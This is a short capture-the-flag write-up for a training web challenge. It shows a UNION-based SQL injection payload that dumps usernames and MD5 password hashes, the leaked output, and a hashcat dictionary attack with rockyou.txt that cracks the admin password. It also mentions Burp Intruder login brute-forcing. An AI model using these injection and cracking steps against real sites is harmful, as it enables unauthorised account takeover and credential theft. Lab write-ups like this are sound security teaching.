# Bruteforce Login

On website with a login page, if we know a username (login) of a member of the site,
we can try every password in a big wordlist of old leaked password on internet.
The most famous wordlist is named rockyou, it contain more that 1 million passwords.
On some website you are timeout after 3 attempts, it is to protect against that attack.

With the SQL Injection, we found a Member_Brute_Force schema in db_default table.

As _username_ and _password_ are columns of _Member_Brute_Force_ schema, which is part of the table _name _db_default_

We can now try
```
1 UNION SELECT username,password FROM Member_Brute_Force.db_default
```

And we get
```
ID: 1 UNION SELECT username,password FROM Member_Brute_Force.db_default
First name: root
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8

ID: 1 UNION SELECT username,password FROM Member_Brute_Force.db_default
First name: admin
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
```

This is probably an hash for the root and admin password, it loots like md5

Lets try bruteforce it with hashcat in kali
```
┌──(kali㉿kali)-[~]
└─$ hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt --force

3bf1114a986ba87ed28fc1b5884fc2f8:shadow

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
```

We can also bruteforce the login page with BurpSuite, and the intruder tool with a wordlist,
but we have to know the login to bruteforce the password.

In this challenge, we can get the flag with the password "shadow" and any login,
not only "root" and "admin"...
